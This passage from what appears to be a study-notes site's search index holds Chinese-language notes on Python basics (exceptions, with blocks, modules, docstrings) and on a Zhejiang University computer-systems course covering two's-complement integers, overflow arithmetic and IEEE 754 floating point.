\u5757\u7ed3\u675f\u81ea\u52a8\u7ed3\u675f with \u5757\u7ed3\u675f\u540e\u53d8\u91cf\u4ecd\u4f1a\u7559\u5b58 with open ( \"file\" , \"r\" , encoding = \"utf-8\" ) as f : s = f . read () ... print ( f . closed ) # True","title":"with \u5757"},{"location":"cs/pl/python/basic/#_38","text":"\u4ea7\u751f\u9519\u8bef -> \u629b\u51fa\u5f02\u5e38 -> \u7a0b\u5e8f\u7ed3\u675f raise \u5173\u952e\u5b57\u629b\u51fa\u5f02\u5e38 try-except \u5757\u6355\u83b7\u5f02\u5e38 \u53ef\u4ee5\u6709\u591a\u4e2a except\u3001\u4e0d\u53ef\u4ee5\u6ca1\u6709 except \u540e\u63a5\u5f02\u5e38\u7c7b\uff08\u6ca1\u6709\u5219\u6355\u83b7\u6240\u6709\uff09 as \u5b57\u53e5\u5b58\u4e0b\u5f02\u5e38 finally \u8bed\u53e5 \u4e0d\u7ba1\u662f\u5426\u6709\u5f02\u5e38\u90fd\u4f1a\u8fd0\u884c raise ... raise RuntimeError ( \"...\" ) try : input ( \">>> \" ) except KeyboardInterrupt : print ( \"Good bye\" ) try : print ( 1 / 0 ) except ZeroDivisionError as e : print ( \"can't devide by zero\" ) raise e finally : print ( \"finished\" )","title":"\u5f02\u5e38\u4e0e\u5904\u7406"},{"location":"cs/pl/python/basic/#if-else","text":"else \u5757\u4e0d\u4ec5\u4ec5\u8ddf\u7740 if \u624d\u80fd\u4f7f\u7528 for-else for \u5faa\u73af\u7ed3\u675f\u624d\u4f1a\u8fd0\u884c for \u5faa\u73af\u88ab break \u4e86\u4e0d\u4f1a\u8fd0\u884c while-else condition \u4e0d\u6210\u7acb\u9000\u51fa\u624d\u4f1a\u8fd0\u884c \u5faa\u73af\u88ab break \u7ec8\u6b62\u4e86\u4e0d\u4f1a\u8fd0\u884c try-else try \u5757\u4e2d\u6ca1\u6709\u5f02\u5e38\u51fa\u73b0\u624d\u4f1a\u8fd0\u884c else \u5757\u4e2d\u5f02\u5e38\u4e0d\u4f1a\u88ab\u524d\u9762\u7684 except \u6355\u83b7 \u7a0b\u5e8f\u6d41\u8df3\u5230\u5757\u5916\u4e86\u4e0d\u4f1a\u8fd0\u884c\uff08return \u7b49\uff09 for value in lst : ... else : ... while condition : ... else : ... try : ... except ... : ... else : ...","title":"if \u5916\u7684 else \u8bed\u53e5"},{"location":"cs/pl/python/basic/#_39","text":"\u6a21\u5757\u53ef\u4ee5\u662f\u4e00\u4e2a\u5355\u72ec\u7684 .py \u6587\u4ef6\uff0c\u4e5f\u53ef\u4ee5\u662f\u4e00\u4e2a\u6587\u4ef6\u5939 \u6587\u4ef6\u5939\u76f8\u5f53\u4e8e\u5bfc\u5165\u5176\u4e0b __init__.py \u6587\u4ef6 \u6a21\u5757\u4e2d\u6b63\u5e38\u7f16\u5199\u51fd\u6570\u3001\u7c7b\u3001\u8bed\u53e5 \u901a\u8fc7 import \u8bed\u53e5\u5bfc\u5165\u6a21\u5757 import code import code as cd from code import ... from code import * \u5bfc\u5165\u65f6\u76f8\u5f53\u4e8e\u8fd0\u884c\u4e86\u4e00\u904d\u5bfc\u5165\u7684\u4ee3\u7801 ## code.py print ( \"hello\" ) def f (): print ( \"call func in code.py\" ) ... import code # hello code . f () import code as cd # hello cd . f () from code import f # hello f () from code import * # hello f ()","title":"\u6a21\u5757\u4e0e\u5bfc\u5165"},{"location":"cs/pl/python/basic/#_42","text":"\u6a21\u5757\u5f00\u5934\u7684\u4e09\u5f15\u53f7\u5b57\u7b26\u4e32 \u7c7b\u3001\u51fd\u6570\u5b9a\u4e49\u4e0b\u9762\u7684\u4e09\u5f15\u53f7\u5b57\u7b26\u4e32 help(...) \u7684\u65f6\u5019\u53ef\u4ee5\u663e\u793a obj.__doc__ \u8868\u793a\u8fd9\u4e32\u5b57\u7b26\u4e32 \u7f16\u8f91\u5668\u7528\u6765\u63d0\u793a \u4e00\u4e9b\u6587\u6863\u751f\u6210\u5de5\u5177\uff08sphinx \u7b49\uff09\u4ece\u4e2d\u83b7\u53d6\u6587\u6863 \"\"\" docstring for module \"\"\" def func ( ... ): \"\"\"docstring for function\"\"\" ... class A (): \"\"\"docstring for class\"\"\" def __init__ ( self , ... ): \"\"\"docstring for method\"\"\" ...","title":"\u6587\u6863\u5b57\u7b26\u4e32"},{"location":"cs/pl/python/basic/#_43","text":"PEP\uff1aPython Enhancement Proposals\uff1a peps.python.org PEP 8 \u89c4\u8303\uff0c\u7ed9\u51fa\u4e86\u63a8\u8350\u4f7f\u7528\u7684 python \u4ee3\u7801\u98ce\u683c\u89c4\u8303 peps.python.org/pep-0008 pep8.org \u66f4\u7ec6\u81f4\u7684\u4ee3\u7801\u98ce\u683c black github.com/psf/black flake8 flake8.pycqa.org ...","title":"\u4ee3\u7801\u89c4\u8303"},{"location":"cs/pl/python/basic/#_44","text":"\u57fa\u7840 \u300aPython \u7f16\u7a0b\uff1a\u4ece\u5165\u95e8\u5230\u5b9e\u8df5\u300b ISBN 978-7-115-54608-1 Python 3 \u83dc\u9e1f\u6559\u7a0b runoob.com/python3/python3-tutorial.html Python \u5b98\u65b9\u6587\u6863 tutorial docs.python.org/3/tutorial \u4e2d\u56fd\u5927\u5b66 mooc - \u6d59\u6c5f\u5927\u5b66 Python \u7a0b\u5e8f\u8bbe\u8ba1 \u8fdb\u9636 \u300a\u6d41\u7545\u7684 Python\u300b ISBN 978-7-115-45415-7 Python \u5b98\u65b9\u6587\u6863 docs.python.org/3 \u5b66\u4e00\u4e9b\u5b9e\u7528\u7684\u7b2c\u4e09\u65b9\u5e93\uff0c\u770b\u6587\u6863 PEP peps.python.org \uff08\u6ce8\u610f\u5206\u6e05\u6709\u6ca1\u6709\u5b9e\u65bd\uff09 GitHub \u627e\u9879\u76ee\u8bfb","title":"\u66f4\u591a\uff1f"},{"location":"cs/pl/python/numpy/","text":"NumPy \u79d1\u5b66\u8ba1\u7b97\u5e93 \u00b6 Abstract numpy \u7684\u4e00\u4e9b\u57fa\u7840\u7528\u6cd5\uff0c\u6574\u7406\u81ea\uff1a \u8d85\u7b97\u5c0f\u5b66\u671f\u7b2c\u4e94\u6b21\u8bfe PPT NumPy documentation NumPy Illustrated: The Visual Guide to NumPy TODO _(:\u0437\u300d\u2220)_","title":"NumPy"},{"location":"cs/pl/python/numpy/#numpy","text":"Abstract numpy \u7684\u4e00\u4e9b\u57fa\u7840\u7528\u6cd5\uff0c\u6574\u7406\u81ea\uff1a \u8d85\u7b97\u5c0f\u5b66\u671f\u7b2c\u4e94\u6b21\u8bfe PPT NumPy documentation NumPy Illustrated: The Visual Guide to NumPy TODO _(:\u0437\u300d\u2220)_","title":"NumPy \u79d1\u5b66\u8ba1\u7b97\u5e93"},{"location":"cs/pl/python/pil/","text":"","title":"PIL"},{"location":"cs/system/","text":"\u8ba1\u7b97\u673a\u7cfb\u7edf \u00b6 Abstract \u6d59\u6c5f\u5927\u5b66 \u201c\u8ba1\u7b97\u673a\u7cfb\u7edf\u201d \u7cfb\u5217\u4e13\u4e1a\u8bfe\u7a0b\u7b14\u8bb0\u53ca\u76f8\u5173\u77e5\u8bc6 \u53c2\u8003\uff1a Computer System: A Programmer's Perspective (3rd.) Table of Contents \u00b6 \u8ba1\u7b97\u673a\u7cfb\u7edf \u2160 \u6570\u5b57\u7684\u8868\u793a\u548c\u5904\u7406 \u6570\u5b57\u903b\u8f91\u57fa\u7840 \u7ec4\u5408\u903b\u8f91\u7535\u8def\u8bbe\u8ba1 \u65f6\u5e8f\u903b\u8f91\u7535\u8def\u8bbe\u8ba1 \u6307\u4ee4\u96c6\u4f53\u7cfb\u7ed3\u6784 \u5904\u7406\u5668","title":"\u8ba1\u7b97\u673a\u7cfb\u7edf"},{"location":"cs/system/#_1","text":"Abstract \u6d59\u6c5f\u5927\u5b66 \u201c\u8ba1\u7b97\u673a\u7cfb\u7edf\u201d \u7cfb\u5217\u4e13\u4e1a\u8bfe\u7a0b\u7b14\u8bb0\u53ca\u76f8\u5173\u77e5\u8bc6 \u53c2\u8003\uff1a Computer System: A Programmer's Perspective (3rd.)","title":"\u8ba1\u7b97\u673a\u7cfb\u7edf"},{"location":"cs/system/#table-of-contents","text":"\u8ba1\u7b97\u673a\u7cfb\u7edf \u2160 \u6570\u5b57\u7684\u8868\u793a\u548c\u5904\u7406 \u6570\u5b57\u903b\u8f91\u57fa\u7840 \u7ec4\u5408\u903b\u8f91\u7535\u8def\u8bbe\u8ba1 \u65f6\u5e8f\u903b\u8f91\u7535\u8def\u8bbe\u8ba1 \u6307\u4ee4\u96c6\u4f53\u7cfb\u7ed3\u6784 \u5904\u7406\u5668","title":"Table of Contents"},{"location":"cs/system/cs1/","text":"\u8ba1\u7b97\u673a\u7cfb\u7edf \u2160 \u00b6 Abstract \u6d59\u6c5f\u5927\u5b66 \u201c\u8ba1\u7b97\u673a\u7cfb\u7edf \u2160\u201d \u8bfe\u7a0b\u53ca\u76f8\u5173\u77e5\u8bc6\u7b14\u8bb0 \u5173\u4e8e \u8ba1\u7b97\u673a\u7cfb\u7edf \u2160\uff1a \u8bfe\u7a0b\u53f7\uff1a21121830 \u4fe1\u606f\u5b89\u5168\u4e13\u4e1a\u5fc5\u4fee\u8bfe \u5305\u542b \u5e38\u89c4\u610f\u4e49 \u4e0a\u7684 \u8ba1\u7b97\u673a\u903b\u8f91\u8bbe\u8ba1\u57fa\u7840 \u548c \u8ba1\u7b97\u673a\u7ec4\u6210\u4e0e\u8bbe\u8ba1 \u4e24\u95e8\u8bfe\u7684\u90e8\u5206\u5185\u5bb9 Table of Contents \u00b6 \u6570\u5b57\u7684\u8868\u793a\u548c\u5904\u7406 \u6570\u5b57\u903b\u8f91\u57fa\u7840 \u7ec4\u5408\u903b\u8f91\u7535\u8def\u8bbe\u8ba1 \u65f6\u5e8f\u903b\u8f91\u7535\u8def\u8bbe\u8ba1 \u6307\u4ee4\u96c6\u4f53\u7cfb\u7ed3\u6784 \u5904\u7406\u5668","title":"\u8ba1\u7b97\u673a\u7cfb\u7edf \u2160"},{"location":"cs/system/cs1/#i","text":"Abstract \u6d59\u6c5f\u5927\u5b66 \u201c\u8ba1\u7b97\u673a\u7cfb\u7edf \u2160\u201d \u8bfe\u7a0b\u53ca\u76f8\u5173\u77e5\u8bc6\u7b14\u8bb0 \u5173\u4e8e \u8ba1\u7b97\u673a\u7cfb\u7edf \u2160\uff1a \u8bfe\u7a0b\u53f7\uff1a21121830 \u4fe1\u606f\u5b89\u5168\u4e13\u4e1a\u5fc5\u4fee\u8bfe \u5305\u542b \u5e38\u89c4\u610f\u4e49 \u4e0a\u7684 \u8ba1\u7b97\u673a\u903b\u8f91\u8bbe\u8ba1\u57fa\u7840 \u548c \u8ba1\u7b97\u673a\u7ec4\u6210\u4e0e\u8bbe\u8ba1 \u4e24\u95e8\u8bfe\u7684\u90e8\u5206\u5185\u5bb9","title":"\u8ba1\u7b97\u673a\u7cfb\u7edf \u2160"},{"location":"cs/system/cs1/#table-of-contents","text":"\u6570\u5b57\u7684\u8868\u793a\u548c\u5904\u7406 \u6570\u5b57\u903b\u8f91\u57fa\u7840 \u7ec4\u5408\u903b\u8f91\u7535\u8def\u8bbe\u8ba1 \u65f6\u5e8f\u903b\u8f91\u7535\u8def\u8bbe\u8ba1 \u6307\u4ee4\u96c6\u4f53\u7cfb\u7ed3\u6784 \u5904\u7406\u5668","title":"Table of Contents"},{"location":"cs/system/cs1/topic1/","text":"\u6570\u5b57\u7684\u8868\u793a\u548c\u5904\u7406 \u00b6 Abstract \u8ba1\u7b97\u673a\u7cfb\u7edf \u2160 \u7b2c\u4e8c\u5468\u8bfe\u7a0b\u5185\u5bb9 \u53c2\u8003\uff1a Computer System: A Programmer's Perspective (3rd.) Chapter 2: Representing and Manipulating Information \u6574\u6570\u8868\u793a\u6cd5 \u00b6 \u65e0\u7b26\u53f7\u6574\u578b \u00b6 \u65e0\u7b26\u53f7\u6574\u578b\u4e00\u822c\u76f4\u63a5\u4f7f\u7528\u5176\u4e8c\u8fdb\u5236\uff08\u539f\u7801\uff09\u6765\u8868 \u6bd4\u5982\u6709\u4e00\u4e2a \\(w\\) \u4f4d\u7684\u6bd4\u7279\u5e8f\u5217 \\(\\overrightarrow{x}=[x_{w-1}, x_{w-2}, \\dots, x_0]\\) \uff0c\u5219\u5c06\u5176\u8f6c\u5316\u4e3a\u65e0\u7b26\u53f7\u6574\u6570\uff1a \\[ B2U_w(\\overrightarrow{x}) = \\sum_{i=0}^{w-1}x_i2^i \\] \u53ef\u4ee5\u77e5\u9053 B2U \u662f\u4e00\u4e2a\u53cc\u5c04 \u540c\u65f6\u4e5f\u5bb9\u6613\u77e5\u9053\u65e0\u7b26\u53f7\u6574\u578b\u53ef\u8868\u793a\u7684\u6700\u5927\u503c\u4e3a \\(UMax_{w}=\\displaystyle\\sum_{i=0}^{w-1}2^i=2^w-1\\) \u6709\u7b26\u53f7\u6574\u578b\u8865\u7801\u8868\u793a \u00b6 \u6700\u5e38\u7528\u7684\u8868\u793a\u6709\u7b26\u53f7\u6574\u578b\u7684\u65b9\u6cd5\u662f\u8865\u7801\uff08Two's-Complement\uff09 \u5bf9\u4e8e\u6bd4\u7279\u5e8f\u5217 \\(\\overrightarrow{x}=[x_{w-1}, x_{w-2}, \\dots, x_0]\\) \uff0c\u5c06\u5176\u89c6\u4e3a\u8865\u7801\u8f6c\u6362\u4e3a\u6709\u7b26\u53f7\u6574\u6570\uff1a \\[ B2T_w(\\overrightarrow{x}) = -x_{w-1}2^{w-1} + \\sum_{i=0}^{w-2}x_i2^i \\] \u5b83\u7684\u6700\u9ad8\u4f4d\uff08MSB\uff09\u662f\u7b26\u53f7\u4f4d\uff0c\u5982\u679c\u662f 1 \u5219\u8868\u793a\u662f\u8d1f\u6570\uff0c0 \u5219\u662f\u6b63\u6570 \u5e76\u4e14\u5bf9\u4e8e\u6b63\u6570\uff0c\u5b83\u5bf9\u5e94\u7684\u6bd4\u7279\u5e8f\u5217\u5c31\u662f\u5176\u4e8c\u8fdb\u5236 \u800c\u5bf9\u4e8e\u8d1f\u6570\uff0c\u5219\u4f7f\u7528\u8865\u7801\uff0c\u5373 \\(-x = \\sim x + 1 (x > 0)\\) \u4ece\u53e6\u4e00\u4e2a\u89d2\u5ea6\u6765\u770b\uff0c\u5b83\u5b9e\u9645\u4e0a\u5c31\u662f\u6539\u53d8\u4e86 MSB \u7684\u6743\u91cd\uff0c\u4ece \\(2^{w-1}\\) \u6539\u4e3a\u4e86 \\(-2^{w-1}\\) \u540c\u65f6\u4e5f\u53ef\u4ee5\u8ba1\u7b97\u51fa\u8865\u7801\u53ef\u4ee5\u8868\u793a\u7684\u8303\u56f4 \\(TMin_w=-2^{w-1}\\) \uff0c \\(TMax_w=2^{w-1}-1\\) \u6709\u7b26\u53f7\u6574\u578b\u53cd\u7801\u8868\u793a \u00b6 \u53cd\u7801\uff08Ones' complement\uff09\u4e5f\u662f\u8868\u793a\u6709\u7b26\u53f7\u6574\u578b\u7684\u4e00\u79cd\u65b9\u6cd5\uff0c\u4f46\u662f\u5e76\u4e0d\u5e38\u7528 \u5bf9\u4e8e\u6bd4\u7279\u5e8f\u5217 \\(\\overrightarrow{x}=[x_{w-1}, x_{w-2}, \\dots, x_0]\\) \uff0c\u5c06\u5176\u89c6\u4e3a\u53cd\u7801\u8f6c\u6362\u4e3a\u6709\u7b26\u53f7\u6574\u6570\uff1a \\[ B2O_w(\\overrightarrow{x}) = -x_{w-1}(2^{w-1}-1) + \\sum_{i=0}^{w-2}x_i2^i \\] \u76f8\u8f83\u4e8e\u8865\u7801\uff0c\u5b83\u4eec\u5728\u6b63\u6570\u4e0a\u662f\u4e00\u6837\u7684 \u4f46\u662f\u5bf9\u4e8e\u8d1f\u6570\uff0c\u53cd\u7801\u8868\u793a\u4e0b\u662f \\(-x = \\sim x (x > 0)\\) \u5728\u53e6\u4e00\u4e2a\u89d2\u5ea6\uff0c\u5b83\u7684 MSB \u7684\u6743\u91cd\u662f \\(2^{w-1}-1\\) \u5b83\u7684\u7f3a\u70b9\u662f 0 \u6709\u4e24\u79cd\u8868\u793a\uff0c\u5373 +0 [00...0] \u548c -0 [11...1] \u65e0\u7b26\u53f7\u4e0e\u6709\u7b26\u53f7\u8f6c\u6362 \u00b6 C \u8bed\u8a00\u4e2d\u5f3a\u5236\u8f6c\u6362\u6709\u7b26\u53f7\u548c\u65e0\u7b26\u53f7\u6574\u578b\u5e76\u4e0d\u6539\u53d8\u6bd4\u7279\u5e8f\u5217\uff0c\u800c\u662f\u6539\u53d8\u8bfb\u53d6\u7684\u65b9\u5f0f \u5373\u4ece\u6709\u7b26\u53f7\u8f6c\u4e3a\u65e0\u7b26\u53f7\u5c31\u662f\u901a\u8fc7\u539f\u7801\u6765\u89e3\u8bfb\u539f\u6765\u8865\u7801\u7684\u4e8c\u8fdb\u5236 \u4ece\u65e0\u7b26\u53f7\u8f6c\u4e3a\u6709\u7b26\u53f7\u5c31\u662f\u901a\u8fc7\u8865\u7801\u89e3\u8bfb\u539f\u6765\u539f\u7801\u7684\u4e8c\u8fdb\u5236 \\[ T2U_w(x) = B2U_w(T2B_w(x)) \\] \u5e76\u4e14\u53ef\u4ee5\u53d1\u73b0\u539f\u7801\u548c\u8865\u7801\u53ea\u5dee\u4e86 MSB \u7684\u6743\u91cd\u4ece\u6b63\u5230\u8d1f\uff0c\u6240\u4ee5 \\(T2U_w(x) = x + x_{w-1}2^w\\) \uff0c\u4e5f\u5c31\u662f\uff1a \\[ T2U_w(x) = \\begin{cases}x+2^w, &x<0\\\\x, &x\\geq 0\\end{cases} \\] \u5bf9\u4e8e\u65e0\u7b26\u53f7\u8f6c\u6709\u7b26\u53f7\uff1a \\[ U2T_w(x) = B2T_w(U2B_w(x)) \\] \u540c\u65f6\uff1a \\[ U2T_w(x) = \\begin{cases}x, &x\\leq TMax_w=2^{w-1}-1\\\\x-2^w, &x > TMax_w=2^{w-1}-1\\end{cases} \\] \u6574\u6570\u8fd0\u7b97 \u00b6 \u65e0\u7b26\u53f7\u6574\u578b\u52a0\u6cd5 \u00b6 \u5bf9\u4e8e\u4e24\u4e2a\u65e0\u7b26\u53f7\u6574\u578b \\(x, y\\in[0, 2^w)\\) \uff0c\u5b83\u4eec\u505a\u52a0\u6cd5\u540e\u7684\u7ed3\u679c\u5728 \\(w+1\\) \u4f4d\u4e0b\u624d\u80fd\u5b8c\u5168\u8868\u793a\u51fa\u6765 \u4f46\u662f\u7ed3\u679c\u4e00\u5b9a\u8fd8\u8981\u8868\u793a\u5728 \\(w\\) \u4f4d\u4e0b\u8868\u793a\uff0c\u8fd9\u65f6\u5c31\u8981\u5bf9\u6ea2\u51fa\u90e8\u5206\u622a\u65ad\uff0c\u5373\u76f4\u63a5\u53bb\u6389\u6700\u9ad8\u4f4d \\[ x+_w^\\mathrm{u}y = (x+y)\\bmod{2^w} \\] \u5373\uff1a \\[ x+_w^\\mathrm{u}y = \\begin{cases} x + y, &x + y < 2^w\\quad \\text{Normal}\\\\ x + y - 2^w, &2^w\\leq x + y < 2^{w + 1}\\quad \\text{Overflow} \\end{cases} \\] \u65e0\u7b26\u53f7\u6574\u578b\u51cf\u6cd5 \u00b6 \u51cf\u6cd5\u5373\u52a0\u4e0a\u51cf\u6570\u53d6\u8d1f\uff0c\u6240\u4ee5\u53ea\u8981\u77e5\u9053\u5982\u4f55\u53d6\u8d1f\u5373\u53ef \u5bf9\u4e8e 0\uff0c\u53d6\u8d1f\u540e\u4e00\u5b9a\u4e5f\u4e3a 0 \u800c\u5bf9\u4e8e\u975e 0 \u6570\uff0c\u56e0\u4e3a\u53d6\u8d1f\u540e\u52a0\u4e0a\u539f\u6570\u4e3a 0\uff08 \\(2^w\\) \u622a\u65ad\u540e\uff09\uff0c\u6240\u4ee5\u53d6\u8d1f\u5373\u7528 \\(2^w\\) \u51cf\u53bb\u539f\u6570\uff1a \\[ -_w^\\mathrm{u}x = \\begin{cases}x, &x=0\\\\2^w-x, &x>0\\end{cases} \\] \u8865\u7801\u8868\u793a\u4e2d\u52a0\u6cd5 \u00b6 \u4f7f\u7528\u8865\u7801\u8868\u793a\u6709\u7b26\u53f7\u6574\u578b\u8fdb\u884c\u52a0\u6cd5\u65f6\uff0c\u4f1a\u9047\u5230\u4e24\u79cd\u7279\u6b8a\u60c5\u51b5\uff1a \u52a0\u6cd5\u540e\u7684\u7ed3\u679c\u592a\u5927\uff0c\u8d85\u8fc7 \\(2^{w-1} - 1\\) \uff0c\u6b63\u6ea2\u51fa\uff08Positive overflow\uff09 \u52a0\u6cd5\u540e\u7684\u7ed3\u679c\u592a\u5c0f\uff0c\u5c0f\u4e8e \\(-2^{w-1}\\) \uff0c\u8d1f\u6ea2\u51fa\uff08Negative overflow\uff09 \u6240\u4ee5\u4e5f\u9700\u8981\u5bf9\u7ed3\u679c\u8fdb\u884c\u622a\u65ad\u5904\u7406\uff1a \\[ x+_w^\\mathrm{t}y = \\begin{cases} x+y-2^w, & 2^{w-1}\\leq x + y \\quad \\text{Positive overflow}\\\\ x+y, &-2^{w-1}\\leq x+y < 2^{w-1}\\quad \\text{Normal}\\\\ x+y+2^w, &x+y < -2^{w-1}\\quad \\text{Negative overflow} \\end{cases} \\] \u4ece\u6bd4\u7279\u5e8f\u5217\u89d2\u5ea6\u6765\u770b\uff0c\u4e5f\u5c31\u662f\u76f4\u63a5\u89c6\u4e3a\u4e8c\u8fdb\u5236\u5e8f\u5217\u76f8\u52a0\uff0c\u518d\u8f6c\u56de\u8865\u7801\u8868\u793a\u7684\u503c\uff1a \\[ x+_w^\\mathrm{t}y=U2T_w(T2U_w(x)+_w^\\mathrm{u}T2U_w(y)) \\] \u8865\u7801\u8868\u793a\u4e2d\u7684\u51cf\u6cd5 \u00b6 \u540c\u6837\uff0c\u4e5f\u662f\u53ea\u8003\u8651\u53d6\u8d1f\u5373\u53ef \u4f46\u662f\u548c\u539f\u7801\u4e0d\u540c\uff0c\u5b83\u672c\u8eab\u5c31\u5e26\u6b63\u8d1f\uff0c\u6240\u4ee5\u53d6\u8d1f\u5219\u53ef\u4ee5\u76f4\u63a5\u8fdb\u884c\uff08\u5373\u53d6\u53cd\u52a0\u4e00\uff09 \u4f46\u6709\u4e00\u4e2a\u7279\u6b8a\uff0c\u4e5f\u5c31\u662f\u6700\u5c0f\u7684 \\(-2^{w-1}\\) \uff0c\u8d1f\u7684\u5b83 \\(2^{w-1}\\) \u5e76\u4e0d\u5728\u8865\u7801\u7684\u8303\u56f4\u4e2d \u800c \\(TMin_w+_w^\\mathrm{t}TMin_w=-2^{w-1}-2^{w-1}=-2^w\\) \uff0c\u622a\u65ad\u540e\u6070\u597d\u4e3a 0 \u6240\u4ee5 \\(-TMin_w = TMin_w\\) \uff0c\u5373\uff1a \\[ -_w^\\mathrm{t}x = \\begin{cases} -2^{w-1}, &x = -2^{w-1}\\\\ -x, &x > -2^{w-1} \\end{cases} \\] \u4e58\u6cd5 \u00b6 \u6574\u578b\u7684\u4e58\u6cd5\u5747\u662f\u76f4\u63a5\u5c06\u539f\u7801/\u8865\u7801\u7684\u4e8c\u8fdb\u5236\u76f8\u4e58\uff0c\u7136\u540e\u76f4\u63a5\u622a\u65ad\u81f3 \\(w\\) \u4f4d \\[ x*_w^\\mathrm{t}y = U2T_w(x*_w^\\mathrm{u}y) = U2T_w(x*y\\bmod 2^w) \\] \u5e76\u4e14\u4e58\u4ee5\u5e38\u6570\u53ef\u4ee5\u901a\u8fc7\u79fb\u4f4d\u6765\u8fdb\u884c\uff0c\u6bd4\u5982\uff1a x * 2 k = x < < k x * 14 = (x < < 3) + (x < < 2) + (x < < 1) \u9664\u4ee5\u4e8c\u7684\u5e42\u6b21 \u00b6 Unsigned \u00b6 \u65e0\u7b26\u53f7\u6574\u578b\u9664\u4ee5\u4e8c\u7684\u5e42\u6b21\u5219\u76f4\u63a5\u8fdb\u884c\u53f3\u79fb\uff1a x / 2 k = x >> k \u5e76\u4e14\u662f\u5411\u4e0b\u53d6\u6574 Signed \u00b6 \u8865\u7801\u8868\u793a\u7684\u6709\u7b26\u53f7\u6574\u578b\u9664\u4ee5\u4e8c\u7684\u5e42\u6b21\uff0c\u8fdb\u884c\u6570\u503c\u53f3\u79fb\uff0c\u4f46\u662f\u76f4\u63a5\u53f3\u79fb\u8fdb\u884c\u7684\u662f\u5411\u4e0b\u53d6\u6574 \u800c\u5bf9\u4e8e\u6709\u7b26\u53f7\u6574\u578b\u9664\u6cd5\u4e00\u822c\u8981\u5411 0 \u53d6\u6574\uff0c\u6240\u4ee5\u5bf9\u4e8e\u8d1f\u6570\u8981\u5411\u4e0a\u53d6\u6574 \u5411\u4e0a\u53d6\u6574\u8981\u5148\u52a0\u4e0a\u4e00\u4e2a bias \u7136\u540e\u518d\u53f3\u79fb\uff0cbias = 2 k - 1\uff0c\u5373 x / 2 k \u5411\u4e0a\u53d6\u6574\u8981\u8fdb\u884c (x + (1 << k) - 1) >> k \u6240\u4ee5\u5411 0 \u53d6\u6574\uff1a (x < 0 ? (x + (1 < < k) - 1) : x) >> k \u6d6e\u70b9\u6570\u8868\u793a\u6cd5 \u00b6 \u524d\u9762\u7684\u6574\u578b\u90fd\u662f\u4e00\u79cd\u5b9a\u70b9\u6570\uff08fixed point\uff09\uff0c\u5373\u5c0f\u6570\u70b9\u7684\u4f4d\u7f6e\u662f\u56fa\u5b9a\u7684\uff08\u56fa\u5b9a\u5728\u672b\u5c3e\uff09\uff0c\u5b83\u7684\u7f3a\u70b9\u662f\u8303\u56f4\u56fa\u5b9a \u800c\u6d6e\u70b9\u6570\uff08floating point\uff09\u7684\u5c0f\u6570\u70b9\u4f4d\u7f6e\u5219\u4e0d\u662f\u56fa\u5b9a\u7684\uff0c\u5b83\u4f7f\u7528 \\(x*2^y\\) \u7684\u5f62\u5f0f\u6765\u8868\u793a\u4e00\u4e2a\u6570 \u4e5f\u56e0\u6b64\u53ef\u4ee5\u8868\u793a\u5f88\u5927\u6216\u8005\u5f88\u5c0f\u7684\u6570 \u5e38\u7528\u7684\u6d6e\u70b9\u6570\u8868\u793a\u65b9\u6cd5\u662f\u7531 IEEE 754 \u6807\u51c6\u6307\u5b9a\u7684 IEEE \u6d6e\u70b9\u6570\u8868\u793a\u6cd5\u90fd\u901a\u8fc7 \\(V=(-1)^s\\times M\\times 2^E\\) \u7684\u5f62\u5f0f\u6765\u8868\u793a\uff0c\u5176\u4e2d\uff1a \\(s\\) \uff1a\u7b26\u53f7\uff08sign\uff09\uff0c1 \u5219\u8868\u793a\u662f\u8d1f\u6570\uff0c0 \u5219\u8868\u793a\u662f\u6b63\u6570 \\(M\\) \uff1a\u5c3e\u6570\uff08mantissa\uff09\u6216\u79f0\u6709\u6548\u6570\u5b57\uff08significand\uff09 \\(E\\) \uff1a\u6307\u6570\uff08exponent\uff09 \u5b83\u4eec\u7684\u5b58\u50a8\u65b9\u5f0f\u662f\uff1a \u6700\u9ad8\u4f4d\u6bd4\u7279\u8868\u793a \\(s\\) \u540e\u63a5 \\(k\\) \u6bd4\u7279 \\([e_{k-1}\\cdots e_1e_0]\\) \u6307\u6570\u90e8\u5206\uff08\u4e5f\u79f0\u4e3a\u9636\u7801\uff09\u7f16\u7801\u4e86 \\(E\\) \u6700\u540e\u662f \\(n\\) \u4e2a\u6bd4\u7279 \\([f_{n-1}\\cdots f_1f_0]\\) \u5206\u6570\u90e8\u5206\uff0c\u7f16\u7801\u4e86 \\(M\\) \u5e76\u4e14\u6709\u4e24\u79cd\u6700\u5e38\u89c1\u7684\u683c\u5f0f\uff0c\u5373\uff1a \u5355\u7cbe\u5ea6\uff08single-precision floating-point\uff09\uff0c \\(k=8\\) \uff0c \\(n=23\\) \uff0c32 \u4f4d\uff084 \u5b57\u8282\uff09\u5b58\u50a8 \u53cc\u7cbe\u5ea6\uff08double-precision floating-point\uff09\uff0c \\(k=11\\) \uff0c \\(n=52\\) \uff0c64 \u4f4d\uff088 \u5b57\u8282\uff09\u5b58\u50a8 IEEE \u6d6e\u70b9\u6570\u503c\u8fd8\u6709\u4e09\u79cd\u5f62\u5f0f\uff0c\u4e0b\u9762\u5206\u522b\u63cf\u8ff0 \u89c4\u7ea6\u5f62\u5f0f \u00b6 \u8fd9\u79cd\u5f62\u5f0f\u4e0b\u7684\u9636\u7801\u4e0d\u5168\u4e3a 0 \u4e5f\u4e0d\u5168\u4e3a 1\uff0c\u662f\u6700\u5e38\u89c1\u7684\u5f62\u5f0f \u8fd9\u79cd\u5f62\u5f0f\u4e0b\u7684 \\(s\\) \u76f4\u63a5\u8868\u793a\u6b63\u8d1f\uff0c\u800c \\(E\\) \u3001 \\(M\\) \u7684\u89c4\u5219\uff1a \\(E\\) \u901a\u8fc7 \u79fb\u7801 \uff08biased\uff09\u8868\u793a\u6210 \u9636\u7801 \\([e_{k-1}\\cdots e_1e_0]\\) \uff0c\u79fb\u4f4d \\(Bias = 2^{k-1}-1\\) \uff0c \\(E = e - Bias\\) \uff08\u5176\u4e2d \\(e\\) \u4e3a\u5c06\u9636\u7801\u8f6c\u4e3a\u65e0\u7b26\u53f7\u6574\u578b\u7684\u503c\uff09\uff0c\u8fd9\u53ef\u4ee5\u4f7f\u9636\u7801\u90e8\u5206\u8303\u56f4\u4ece \\([1, 2^k-2]\\) \u53d8\u4e3a \\([-2^{k-1}+2, 2^{k-1}-1]\\) \\(M = 1+f\\) \uff0c\u5176\u4e2d \\(f = 0.f_{n-1}\\cdots f_1f_0\\in[0, 1)\\) \uff0c\u56e0\u6b64 \\(M=1.f_{n-1}\\cdots f_1f_0\\in[1, 2)\\) \u8ba1\u7b97\u540e\u518d\u901a\u8fc7 